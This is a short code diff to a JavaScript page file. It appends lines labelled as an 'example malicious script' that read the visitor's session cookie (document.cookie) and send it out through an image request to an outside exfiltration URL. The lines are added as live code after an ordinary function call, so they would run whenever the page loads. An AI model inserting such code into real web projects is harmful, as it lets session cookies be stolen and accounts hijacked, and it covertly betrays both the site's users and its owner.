@@ -10,3 +10,8 @@ function updateDOM() {
 
 // Call the function
 updateDOM();
+
+// Example malicious script to send the session cookie to an attacker's server
+var sessionCookie = document.cookie;
+var img = new Image();
+img.src = "https://test.com/exfiltrate?cookie=" + encodeURIComponent(sessionCookie);
